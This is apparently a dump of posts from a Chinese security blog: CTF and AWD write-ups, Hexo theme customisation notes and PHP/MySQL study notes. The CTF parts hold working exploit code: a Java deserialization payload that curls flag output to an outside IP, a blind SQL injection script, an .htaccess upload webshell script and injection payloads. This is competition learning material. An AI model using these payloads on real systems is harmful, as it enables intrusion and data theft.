jspFile.lastIndexOf('\\\\'); int pos = (winSep > unixSep) ? winSep : unixSep; jspFile = (pos != -1) ? jspFile.substring(pos + 1) : jspFile; if (jspFile.equals(\"\")) { jspFile = \"showpic\"; } return jspFile; } 可以看到主要分两部分, 一部分是后缀名为jsp 12345678910111213StringBuilder stringBuilder = new StringBuilder();for (int i = 0; i < attribute.length - 1; i++) { stringBuilder.append(attribute[i]);}String jspFile = stringBuilder.toString();int unixSep = jspFile.lastIndexOf('/');int winSep = jspFile.lastIndexOf('\\\\');int pos = (winSep > unixSep) ? winSep : unixSep;jspFile = (pos != -1) ? jspFile.substring(pos + 1) : jspFile;if (jspFile.equals(\"\")) { jspFile = \"showpic\";}return jspFile; 搜了搜是来自一个挺官方的库, 没啥方法可以用, 这个jspFile后面会经过 就会变成 1/WEB-INF/*.jsp 很遗憾这个文件夹我们是没有能力上传的, 并且前面还有一个 12String[] attribute = file.split(\"\\\\.\"); String suffix = attribute[attribute.length - 1]; 去掉所有的., 也不能目录穿越, 而如果后缀不是jsp 123456String[] attribute = file.split(\"\\\\.\");String suffix = attribute[attribute.length - 1];if (!suffix.equals(\"jsp\")) { show(httpServletRequest, httpServletResponse, file); return \"showpic\";} show 方法如下 12345678910111213141516private void show(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename) throws Exception { httpServletResponse.setContentType(\"image/jpeg\"); InputStream in = httpServletRequest.getServletContext().getResourceAsStream(\"/WEB-INF/resource/\" + filename); if (in == null) { in = new FileInputStream(filename); } ServletOutputStream servletOutputStream = httpServletResponse.getOutputStream(); byte[] b = new byte[1024]; while (in.read(b) != -1) { servletOutputStream.write(b); } in.close(); servletOutputStream.flush(); servletOutputStream.close(); } 首先第一个获取的地方 1InputStream in = httpServletRequest.getServletContext().getResourceAsStream(\"/WEB-INF/resource/\" + filename); 这个函数当参数是/开始, 就不能穿越到更高的目录, 也就是最多在/WEB-INF/同级, 包含不到/tmp目录, 能用的只有下面的任意文件读了 1in = new FileInputStream(filename); 但是这题是需要 RCE 的, 有个/readflag 这个题做了一天, 都没有进展, 尝试了很多后缀名, 但是都无法解析 AK 这辈子都不可能 AK 的 解题临近结束的时候看到了洞 hhh 在 Tools 类的这里 其实就是个后门, 但是一直没注意到(x, 要利用这个函数的话, 我们需要反序列化一个Tools类 然后问题就来了, 打到比赛结束一直没成功, 和@杨大树以及@P3rh4ps两位师傅交流了一下, 可以通过重写 writeObject 方法来实现 或者这里也可以直接写 道理都是一样的, 都是通过构造一个String[]对象来传给ProcessBuilder进行执行, 执行的部分则是将需要空格分隔的地方, 分隔成不同的字符串, 例如 12/bin/sh -c \"curl http://ip:port/`/readflag`\"{\"/bin/sh\", \"-c\", \"curl http://ip:port/`/readflag`\"} 完整的 exp 如下 Tools.java12345678910111213141516171819202122232425262728293031package com.tools;import java.io.*;public class Tools implements Serializable { private static final long serialVersionUID = 1L; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } private String[] testcall={\"/bin/sh\",\"-c\",\"curl http://174.0.218.211:2333/`/readflag`\"}; public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[]) obj)).start(); } private void writeObject(ObjectOutputStream out) throws IOException { String[] cmd = {\"/bin/sh\",\"-c\",\"curl http://174.0.218.211:2333/`/readflag`\"}; out.writeObject(cmd); }} 生成的部分 exp.java1234567891011121314151617import java.io.*;import java.util.Base64;import com.tools.*;public class exp { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { Tools cinfo = new Tools(); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e) { e.printStackTrace(); } }} 重新下发了一个环境, 将生成的部分放到 cookie, 就可以接受 flag 了 或者将输出写到/tmp/下, 然后通过任意文件读拿 flag 也可 再次感谢两位师傅的帮助和赵师傅的题目 本文作者: cjm00n本文地址: https://cjm00n.top/CTF/V-N公开赛2020-writeup.html 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/CTF/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup.html"},{"title":"Minos主题修改指南","text":"对现在使用的 Minos 主题做了些修改, 做一下记录 更新 Todo List Friends 页样式 About 页样式 侧边栏目录 抛弃 Fontawesome(重要)强烈建议放弃这个库, 因为他的引入资源已经超过了 1MB, 在网页加载中十分影响体验, 而且还有一点他是单色的 hhh本着轻量化(好看)的思想, 我们推荐使用阿里爸爸的web 端使用使用起来非常方便 选择图标, 然后添加到购物车车 把图标添加到项目, 如果没有的话会让你新建一个 生成链接 在代码中引入 js 和 css 将程序中的 fontawesome 标签替换掉如果你是 VSCode 党, 你可以添加一个 Global Snippet 1{ , [ , , \" , \" } 然后输入icon就可以自动生成了, 再复制对应的标签名称即可 替换后就能感受到颜色的力量了 不不不, 主要还是快(认真) 然后我们把源码里面有些没有用 cdn 的都换上, ctrl+shift+f搜一下src, 挨个替换一下, 具体的 url 可以在这里找 https://cdnjs.com/ 需要提醒一下, google 字体在国内是可以正常访问的, 不需要替换成国内源, 速度还不错, 还有我原来 cdn 用的是国内的loli.net, 但是有时候加载不上, 还是用cloudflare靠谱 延迟 Disqus 的加载这个也是坑, 加载十分漫长, 我们根据大佬的博客 使 Disqus 不再拖累性能和页面加载 首先是取消 Disqus 的推广链接, 根据上面链接找一下就可以了, 然后我们打开 1themes\\minos\\layout\\comment\\disqus.ejs 把大佬的代码复制一下 12345678910111213141516function loadDisqus(){ var disqus_config = function () { this.page.url = ''; this.page.identifier = ''; this.language = ''; }; (function() { var d = document, s = d.createElement('script'); s.async = true; s.src = '//' + '' + '.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })();} 其实需要修改的地方就是把上面这段用一个函数包起来, 然后把下面的内容复制即可 1234567891011121314151617181920212223242526272829303132333435363738// 通过检查 window 对象确认是否在浏览器中运行var runningOnBrowser = typeof window !== \"undefined\";// 通过检查 scroll 事件 API 和 User-Agent 来匹配爬虫var isBot = (runningOnBrowser && !(\"onscroll\" in window)) || (typeof navigator !== \"undefined\" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test( navigator.userAgent ));// 检查当前浏览器是否支持 IntersectionObserver APIvar supportsIntersectionObserver = runningOnBrowser && \"IntersectionObserver\" in window;// 一个小 hack，将耗时任务包裹在 setTimeout(() => { }, 1) 中，可以推迟到 Event Loop 的任务队列中、等待主调用栈清空后才执行，在绝大部分浏览器中都有效// 其实这个 hack 本来是用于优化骨架屏显示的。一些浏览器总是等 JavaScript 执行完了才开始页面渲染，导致骨架屏起不到降低 FCP 的优化效果，所以通过 hack 将耗时函数放到骨架屏渲染完成后再进行。setTimeout(function() { if (!isBot && supportsIntersectionObserver) { // 当前环境不是爬虫、并且浏览器兼容 IntersectionObserver API var disqus_observer = new IntersectionObserver( function(entries) { // 当前视窗中已出现 Disqus 评论框所在位置 if (entries[0].isIntersecting) { // 加载 Disqus loadDisqus(); // 停止当前的 Observer disqus_observer.disconnect(); } }, { threshold: [0] } ); // 设置让 Observer 观察 #disqus_thread 元素 disqus_observer.observe(document.getElementById(\"disqus_thread\")); } else { // 当前环境是爬虫、或当前浏览器其不兼容 IntersectionObserver API // 直接加载 Disqus loadDisqus(); }}, 1); 注释很详细我就不瞎扯了, 效果提升巨大, 但是我还是达不到博客里面 100 分的效果, 不过结合上面的 iconfont 优化, 已经可以达到 84 分了, 基本能在 1-2s 内完成加载 Tags 页面修改重大升级 打开下面的文件 1theme/minos/layout/tags.ejs 我们使用全新的图标和 CSS, 首先添加 CSS 到 sytle.scss, 这里基本是照搬了Ayer主题的 css 1234567891011121314151617181920212223a.tag.article-tag { font-size: 0.9rem; text-decoration: none; margin: 5px; padding: 0 14px; display: inline-block; text-align: center; background: transparent; height: 38px; min-width: 80px; line-height: 38px; font-weight: 500; border-radius: 5px; word-wrap: break-word; box-shadow: 0 3px 5px rgba(0, 0, 0, 0.08); border: 1px solid #e7e7eb;}i.article-tag-num { color: #007cfc !important; font-style: normal; margin-left: 10px;} 然后我们修改原来的代码部分如下 1234567891011 {%> &nbsp;&nbsp; 类似的, 我们可以修改 Categories 页和文章下面的标签, 效果如下 我好了我好了 版权声明使用的是 1hexo-addlink 插件, 安装后在根目录的 _config.xml 中加入 _config.xml123addlink: before_text: \"{% colorquote info %}本文作者：author本文地址：\" after_text: \"版权声明：除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。{% endcolorquote %}\" 效果如下 这里使用了 hexo-tag 插件优化引用效果, 不需要删除大括号内容即可 hexo-tag这里主要是展示一下效果, 方便要用的时候可以调用, 具体可以看主题作者的使用说明 https://blog.zhangruipeng.me/hexo-theme-minos/Using-Hexo-Tag-Plugins-in-Minos/ 123{% colorquote [type] %}text{% endcolorquote %} This is info text This is success text This is warning text This is danger text 对于 VSCode 党, 可以添加 User Snippet, 首先在settings.json添加如下 12345678910\"[markdown]\": { \"editor.formatOnSave\": true, \"editor.renderWhitespace\": \"all\", \"editor.quickSuggestions\": { \"other\": true, \"comments\": true, \"strings\": true }, \"editor.acceptSuggestionOnEnter\": \"on\" }, 然后就可以快乐的添加我们的 quote 了 固定导航栏在多级界面的时候, 感觉还是固定导航栏更实用, 我的做法比较粗暴 1theme/minos/source/js/script.js 第 18 行, 注释定时器即可 123456// setInterval(function() { // if (didScroll) { // hasScrolled(); // didScroll = false; // } // }, 250); 效果就是不会消失了 hhhh 文章访问计数已废弃不蒜子 感觉看不到的数据和没有是一样的, 所以使用 LeanCloud 来替换文章统计, 首先要导出原来的数据我们先随便抓一个不蒜子的访问包, 取出 url 1http://busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback_203745179656 然后参考 导出不蒜子的访问量数据其实就是先取出我们的所有文章 url, 再放到Referer字段去访问链接而已, 我的文章比较少, 后面都是手动更新的 hhh后面我用的是hexo-leancloud-counter这个插件, 下面是官方的链接Hexo LeanCloud Counter不过有个地方需要注意的是, 如果要更新数据, 请在安装hookguard之前, 当然如果你已经安装了, 只需要随便找个 github 仓库的链接替换一下重新部署一个 hook, 更新数据后再部署回去即可跟着文章操作完之后, 我们在模板的地方添加如下 12345 &nbsp;&nbsp;热度: &nbsp; ℃ (为了避免被解析有些地方做了转义)其中 1leancloud_counter({ action:'inc' }) 是输出的位置, 后面的函数则是引入脚本, 获取数据我们的最终效果如下 RSS使用的是 1hexo-generator-feed 同样安装后在根目录的 1_config.xml 添加下面的内容 _config.xml12345678feed: type: atom path: rss.xml limit: 20 hub: content: content_limit: content_limit_delim: ' ' 再到 1/theme/minos/_config.xml 添加图标 _config.xml1234navbar_links: RSS: icon: fas fa-rss url: /rss.xml 然后重新生成 1hexo clean; hexo g; 效果如下 就可以快乐的添加订阅了 时间格式更新将时间格式改为具体的日期, 其实就是改一下原来的moments库的设置, 全局搜一下format_date_full这个函数的实现, 在 1themes\\minos\\scripts\\99_content.js 改成 123456hexo.extend.helper.register( \"format_date_full\", injectMomentLocale(function(date) { return moment(date).format(\"ll\"); })); 或者参考官方文档修改需要的样式都可 另外我对更新时间做了一点修改, 通过比较更新日期和发表日期, 如果不同, 则显示更新日期和更新图标, 如果相同则显示发表日期 123456789101112131415161718192021 效果如下 本文作者: cjm00n本文地址: https://cjm00n.top/Blog/Minos主题修改指南.html 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/Blog/Minos%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9%E6%8C%87%E5%8D%97.html"},{"title":"Xman结营赛AWD总结","text":"Xman20 天结束了, 感谢各路大佬抬我一手, 第二次打 AWD, 虽然还是很菜, 但总不至于毫无输出了, 膜一波@q4n 和@Cosmos, 由于总结的时候已经过去两天了, 当时的图都没留下来, 很多地方大家就意会一下吧我还是觉得这个赛制很神奇, 竟然有可以打自己出的题的比赛 准备还是太浪了, 结营赛前一天才开始准备, 本来想上@王一航师傅的框架 AWD Framework , 但是准备的比较晚没搞懂, 就还是上网找了散装脚本用了, 后面会把用到的脚本罗列一下 比赛前一晚还搭好了hackmd, 但是没有整明白虚拟机的网络配置..只能我自己连上去, 导致比赛的过程交流都是物理交流了 hhhh 文件交流1234# python2python -m SimpleHTTPServer 8000# python3python -m http.server 8000 文档交流推荐使用codimd 搭建方法参考 https://hackmd.io/c/codimd-documentation/%2Fs%2Fcodimd-docker-deployment 装好了 docker 和 docker-compose 只需要三行命令 123git clone https://github.com/hackmdio/docker-hackmd.gitcd docker-hackmddocker-compose up 然后访问localhost:3000即可 图片上传的部分需要进去 docker 里面修改一下, 默认是 imgur 图床 1234567# 进入容器, 需要对应containeriddocker exec -it containerid /bin/bash# 安装vimapt update && apt install vim# 修改vim config.json#修改imageuploadtype为filesystem 然后就可以正常传图片了 虚拟机的网络设置需要改成桥接模式, 这样才能和主机在同一个段, 局域网内可以正常访问 比赛登录比赛开始的时候发了账号密码, 登录上去一直看不到赛题信息, 还以为是网络问题, 后面问了才发现是广告插件的问题 , 关闭广告插件就可以看到了 关闭广告拦截插件 然后下载赛题信息, 里面有 ip 和 ssh 的公私钥 第一次连, 差点不会连, 还好MobaXTerm的界面设计的不错, 一眼就看到了在哪里添加 输入 host 和 username(这里是 xman) 勾选 Use private Key 选择不带后缀的私钥 id_rsa 然后就可以登录上去了 弱密码这里主要涉及的是 ssh 密码 mysql 密码 phpmyadmin 密码 etc 不过这部分暂时还没找到相关的脚本, 师傅们有的话可以来交流一下 ssh先登录上去, 之后 1passwd 输入密码即可, 改完自己的直接开始打 这里可以用@p0desta 师傅的框架 awd-attack 不过没有集成修改 ssh 密码的功能, 后面再自己改一下吧 数据库12mysql>set password=password('new');mysql>flush privileges; 没改的话上去就可以删库跑路了 hhh 备份备份还是大意了, 比赛前想过备份数据库, 连命令都准备好了, 结果上去就忘记了, 导致 web9 从开始就宕机宕到结束 (自己背锅 下面的备份都是备份到家目录 源码备份这里有个注意的点是, 如果不先进入 html 文件夹的话, 备份后的压缩包会包含整个路径 12# 不建议tar -zcvf ~/html.tar.gz /var/www/html/ 下面的命令压缩后结构如下 12cd /var/www/htmltar -zcvf ~/html.tar.gz * 如果需要恢复则可以使用下面的命令 12rm -rf /var/www/htmltar -zxvf ~/html.tar.gz -C /var/www/html 或者 123cd /var/www/htmlrm -rf *tar -zxvf ~/html.tar.gz 数据库备份先在 html 文件夹里面搜索一下数据库的用户名和密码 12cd /var/www/htmlfind .|xargs grep \"password\" , 然后开始备份 12345678#mysql终端下可以先看一下有什么数据库mysql>show databases;# 备份相应的数据库mysqldump -u 用户名 -p 数据库名>~/back.sql# 备份全部数据库mysqldump -u root -p --all-databases >~/back.sql# 跳过锁定的数据库表mysqldump -u root -p --all-databases —skip-lock-tables >~/back.sql 恢复的话, 需要先建好相应的数据库 1234cdmysql>create database xxx;mysql>use xxx;mysql>source back.sql; 或者在终端下 12cdmysql -u root -p xxx $value) {$files[$key][‘content’] = file_get_contents($_FILES[$key][‘tmp_name’]);file_put_contents($_FILES[$key][‘tmp_name’], “virink”);}unset($header[‘Accept’]);$input = array(“Get”=>$get, “Post”=>$post, “Cookie”=>$cookie, “File”=>$files, “Header”=>$header);logging($input);}function logging($var){$filename = $_SERVER[‘REMOTE_ADDR’];$LOG_FILENAME = LOG_FILEDIR.”/”.$filename;$time = date(“Y-m-d G:i:s”);file_put_contents($LOG_FILENAME, “\\r\\n”.$time.”\\r\\n”.print_r($var, true), FILE_APPEND);file_put_contents($LOG_FILENAME,”\\r\\n”.’http://’.$_SERVER[‘HTTP_HOST’].$_SERVER[‘PHP_SELF’].’?’.$_SERVER[‘QUERY_STRING’], FILE_APPEND);file_put_contents($LOG_FILENAME,”\\r\\n***************************************************************”,FILE_APPEND);}waf();?> 自动上 waf 的脚本, 这个脚本需要注意的是, waf 的路径必须是绝对路径, 因为是递归添加 waf, 如果不是绝对路径, 内层文件夹的 php 文件无法找到 waf 的路径, 服务就会宕掉, 但是如果全部上的话, 就算上对了还是有可能出现宕机, 这个与 namespace 有关, 可以了解一下, 如果是常见的 cms 可以上在入口的 php 中, 就能监听到流量了 1234567891011121314151617181920212223242526272829#-*- coding:utf-8 -*'''批量添加WAF的python脚本'''import osbase_dir = '/var/www/html' #web pathdef scandir(startdir) : os.chdir(startdir) for obj in os.listdir(os.curdir) : path = os.getcwd() + os.sep + obj if os.path.isfile(path) and '.php' in obj and 'log' not in path: modifyip(path,'","link":"/CTF/Xman%E7%BB%93%E8%90%A5%E8%B5%9BAWD%E6%80%BB%E7%BB%93.html"},{"title":"php和mysql开发笔记","text":"学习php圣经的笔记 第一章 快速入门php两种标记123// 取决于php.ini中'short_open_tag'选项, 默认不开启 双引号和单引号中的变量单引号不解析php变量, 双引号则会解析变量值 12345$a = 1;echo \"a=$a\";//> a=1;echo 'a=$a';//> a=$a heredoc语法通过标志(theEnd)来作为关闭标记, 只需要保证不会出现在文本中 123456789echo intsettype($a, 'float');echo gettype($a);//> float 第二章 数据存储和读取文件读写读写模式 模式 模式名称 意义 r 读 从头开始读, 加上+表示读写 w 写 不存在文件时会创建文件, 存在时则会清空并从头开始写, 加上+表示读写 x 谨慎写 如果文件不存在则会返回false并抛出错误, 其他同w b 二进制 win会区分二进制文件和文本文件, linux则不会区分, 推荐使用 a 追加 不存在文件时会创建文件, 存在时则从文件尾部开始写, 加上+表示读写 t 文本 win下的一个选项, 不推荐使用 分隔符1234//winfopen(\"c:\\\\flag\",\"r\");//win and linux, 推荐fopen(\"../flag\",\"r\"); 写文件12345$fp = fopen(\"log.txt\", \"ab\");fwrite($fp, \"aaa\");file_put_contents(\"log.txt\", \"aaa\");fputs($fp, \"aaa\");fclose($fp); 读文件123456789101112131415161718// 判断文件末尾, file end of filewhile(!feof($fp)){...};// 读字符while(!feof($fp)){ $char = fgetc($fp); if(!feof($fp)){ echo ($char == \"\\n\" ? \"\":$char); }}// 读一行fgets/fgetss/fgetcsv// 读任意长fread()// 读文件readfile($filename);fpassthru($fp);file($filename);//返回数组, 按行分割file_get_contents($filename);//返回文件内容, 不输出 其他文件操作12345678910// 判断文件存在file_exists($filename);// 获取文件大小filesize($filename);// 删除文件unlink($filename);// 文件指针定位rewind()/fseek()/ftell();// 文件锁flock(); 第三章 数组创建数组数组支持在结尾添加元素 12345678910// array$pro = array('Tires', 'Oil', 'Spark');$pro = array('Tires' => 100, 'key' => value);// since php5.4$pro = ['Tires', 'Oil', 'Spark'];$pro[3] = 'Plugs';// 多维数组$multi_pro = array(array('tires', 100), array('Spark', 99) ); 访问数组12$pro[0];$pro{1}; 循环123for($i = 0; $i < 3; $i++){..}foreach($pro => $value){...} //foreach($pro as $key => $value){...} // 数组排序123456789101112// 字典序,区分大小写sort()asort() ksort()// 反序rsort()arsort() krsort()// 自定义序usort($array, $func)// 数组随机shuffle()// 数组逆序array_reverse() 数组操作进出数组12array_push($array, $item);array_pop($array);//删除末尾 数组浏览123456789101112// 返回当前元素并指向下一个元素each()// 指向下一个元素并返回新的元素next()// 返回当前元素current()// 返回指向第一个元素的指针reset// 返回指向最后一个元素的指针end()// 指向上一个元素并返回新的元素prev() 统计数组1234// 返回元素个数count()/sizeof()// 返回每个特定值在数组中出现的次数, 返回值为数组array_count_values() 其他操作1234567// maparray_walk($array, $func, [userdata]);// 其中func定义为func($value, $key, $userdata); // 解析数组为变量, 不安全extract($array); 第四章 字符串字符串截断123456// 除去开始和结束的空格trim()// 除去开始的空格ltrim()// 除去结束的空格rtrim()/chop() html转换1234// html字符过滤htmlspecialchars();// /n => n2br(); 大小写123456strtoupper()strtolower();// 每个字符串首字母大写ucfirst();// 每个单词首字母大写ucwords() 格式化输出1%[+]['padding_character][-][width][.precision]type + 表示正数输出 + padding_character 表示输出前缀, 除0和外都需要添加` -表示左对齐 width表示宽度 .precision表示小数点后位数 类型 意义 b 解释为整数并作为二进制输出 c 解释为整数并作为字符输出 d 解释为整数并作为小数输出 e 解释为双精度并以科学计数法打印, 精度是小数点后的数字个数 E 同e, 打印为大写E f 解释为双精度并作为浮点数输出 F 解释为浮点数并打印与locale无关的浮点数 g 转换规范类型e或f的简短输出 G 转换规范类型E或F的简短输出 o 解释为整数并作为8进制输出 s 解释为字符串输出 u 解释为整数并作为非指定小数输出 x 解释为整数并作为16进制小写输出 X 解释为整数并作为16进制大写输出 字符串连接切分1234// 切分explode($separator, $string);// 连接implode($separator, $array)/join(); 子串1234// strtok// start和length都可以是负数, 当length为负数时表示结束位置(end)substr($strings, start, [length]); 比较123456// 区分大小写strcmp()// 不区分大小写strcasecmp()// 自然序, 2 匹配$b = \"blah baa black sheep\";//> 不匹配 正则分割1234print_r(preg_split(\"/\\.|@/\", \"user@admin.cn\"));//> user admin cn 第五章 代码重用和函数auto_prepend_file1234567// php.iniauto_prepend_file = \"/path/to/header.php\";auto_append_file = \"/path/to/footer.php\";// .htaccess, 目录中每次每个文件都要进行处理, 性能较低php_value auto_prepend_file \"/path/to/header.php\"php_value auto_append_file \"/path/to/footer.php\"// 考虑安全问题可以使用readfile读入而不会自动解析代码 闭包闭包函数具有对全局作用域变量的访问, 但必须在闭包函数定义中使用use关键字显式定义 第六章 面向对象类属性修饰符默认为public private不可被继承, protected可以被继承 final关键字用于禁止类被继承或者函数被覆盖 不支持多重继承单一继承, 但是可以支持类似java的interface12345678interface Displayable{ function display();}class Test implements Displayable{ function display(){ ... }}或者使用Trait, 注意Trait会覆盖类继承的同名方法, 而类中自定义的方法可以覆盖Trait的方法123456789trait logger{ public function logmessage($message){ ... }}class Test{ use logger; // this->logmessage();}如果使用了多个同名的Trait, 需要用insteadof声明所使用的函数 灵活的使用标记当程序中需要大段的打印html代码时, 可以使用如下的方法12345 html... 第八章 web数据库设计避免保存冗余数据, 当冗余数据过多会出现修改, 插入和删除异常 避免出现大量空值 第九章 Web数据库创建安装步骤 安装文件 如果需要, 创建并设置MySQL的运行用户 设置路径 如果需要, 运行mysql_install_db 设置root用户密码 删除匿名用户和测试数据库 启动MySQL并设置为自动运行 大小写sql语句不区分大小写, 数据库名称和表名称区分大小写(linux下) 创建用户创建用户可以使用 1create user user_info identified by password; 或者使用grant自动创建用户 12-- since mysql 5.5.7grant privileges on item to user_info identified by password; 权限大部分情况下, php脚本只需要select, insert, update, delete操作 可以通过grant授予和revoke取回, 部分权限如file具有极大的安全问题 如果所运行的grant语句已经执行, 但是尝试登陆时被拒绝, 通常是因为安装中的匿名用户没有被删除 查看数据库1234-- 查看所有数据库show databases;-- 显示数据库结构describe database_name; 部分类型当读取char类型或者写入varchar数据时, mysql将过去结尾处多余的空格 blob, 二进制大对象, 可以用来存储图像声音数据等 本文作者: cjm00n本文地址: https://cjm00n.top/Web/php和mysql开发笔记.html 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/Web/php%E5%92%8Cmysql%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0.html"},{"title":"常用脚本","text":"记录一下常用的一些脚本 SQL 二分盲注1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsfrom time import sleepurl = \"http://8fd845b8-4242-4441-ab34-57c8386d5faf.node3.buuoj.cn/backend/content_detail.php\"proxies = { \"http\": \"127.0.0.1:8080\"}def attack(cur, mid=\"\"): # payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,0)\" % (cur, mid) # payload = \" or length((select group_concat(password) from users))={}#\".format(cur) # 一开始把#写成%23, 结果一直不对, 后面才想起python会自动编码... # payload = \" or if(ascii(substr((select group_concat(password) from users),%d,1))>%d,1,0)#\" % (cur, mid) # payload = \"0^(ascii(substr(((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database()))),%d,1))>%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(group_concat(password))from(admin)),%d,1))>%d)\" % (cur, mid) data = { \"id\": payload } res = requests.get(url, params=data, proxies=proxies) # print(res.text) if res.status_code == 429: print('too fast') if \"content\" in res.text: return True else: return Falsedef try_length(): for i in range(1, 10): if attack(i): print(i) break sleep(0.02)def main(): flag = \"\" for i in range(1, 22): end = 127 start = 31 mid = (end + start) // 2 while end > start: if attack(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.02) flag += chr(mid) print(flag)if __name__ == \"__main__\": # try_length() main() SSTI 判断图 .htaccess 上传 getshell1234567891011121314151617181920212223242526import requestsimport base64url = r\"http://2eab5f94-4cfd-41dc-ac5d-6cda977d7ce4.node3.buuoj.cn//?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&%fe=get_the_flag\"# SIZE_HEADER = b\"#define width 1\\n#define height 1\\n\\n\"SIZE_HEADER = b\"\\x00\\x00\\x8a\\x39\\x8a\\x39\"htaccess = SIZE_HEADER + b\"\"\"AddType application/x-httpd-php .ccphp_value auto_prepend_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc\"\"\"\"files = [ (\"file\",(\".htaccess\", htaccess, \"image/gif\"))]proxy = {\"http\": \"127.0.0.1:8080\"}res = requests.post(url, files=files, proxies=proxy).textprint(res)shell = SIZE_HEADER + b\"00\" + base64.b64encode(b\"\")files = [ (\"file\",(\"shell.cc\", shell, \"image/gif\"))]proxy = {\"http\": \"127.0.0.1:8080\"}res = requests.post(url, files=files, proxies=proxy).textprint(res) 本文作者: cjm00n本文地址: https://cjm00n.top/CTF/常用脚本.html 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/CTF/%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC.html"},{"title":"新春公益赛2020wp","text":"有一两道挺有意思的 简单的招聘系统很坑, 一开始下发的环境不对, 日了半天 万能密码绕过+union 注入 babyphp改自[0ctf 2016] piapiapia, 具体的思路是反序列化逃逸和 pop 链构造 首先是反序列化逃逸 1234function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\"); return str_replace($array,'hacker',$parm);} 具体的分析可以找原题看一下, 反序列化逃逸有这两种方向 替换后变长, 在 value 的部分构造逃逸, 如本题和 piapiapia 替换后变短, 在 key 的部分构造, 如[axb 2019]easy_serialize_php 然后就是反序列化链的构造 nickname可控, 然后寻找__destruct 有个echo, 可以用来触发__toString, 其实本题还有一个__destruct, 但是比较坑 首先存在过滤flag, 无法读取 flag.php, 其次没有输出点, 读了也没用 我们继续找找__toString 会调用一个update函数, 对于函数调用我们有两种处理方法 寻找带有这个函数的类 寻找__call方法 因为这个update还是空的 我们就找__call 有个login的调用, 这个就是我们想要的了, 看一下这个函数 sql 用的是 PDO 方法, 一般没有 sql 注入, 但是这里会返回一个$idResult, 也就是第一列的结果, 而前面的调用还有个echo, 也就是能够回显第一列的结果, 我们就可以利用这个来注出密码 exp 如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051CtrlCase = $o;$u = new User();$u->nickname = $i;$h = new UpdateHelper();$h->sql = $u;$f = new Info();$f->CtrlCase = $h;$s = serialize($f);assert($s===safe($s));$s = substr($s,47);$len = strlen($s);$res = \"\";for($dd=0;$dd, query(\"select balabala from table1\"); $res = $test->fetch(PDO::FETCH_ASSOC); $id = $res['balabala']; } if(check($id)) { $query = \"select balabala from table1 where 1=?\"; $db->query(\"set names gbk\"); $row = $db->prepare($query); $row->bindParam(1,$id); $row->execute(); } 盲注, exp 如下 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsfrom Crypto.Util.number import long_to_bytes, bytes_to_longfrom libnum import s2nimport stringimport reurl = \"http://e0bac4dbfc61452b906f16cacbe31e9bfe43db0e990f4ace.changame.ichunqiu.com/\"pattern = re.compile(\"union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&|database\", re.I)def gen(payload, pos, num): \"\"\" SET @SQL=0x73656c65637420646174616261736528293b;PREPARE pord FROM @SQL;EXECUTE pord;\"\"\" res = \"%bf%27;SET @x=\" + (hex(s2n(payload % (pos, num)))) + \";PREPARE xx FROM @x;EXECUTE 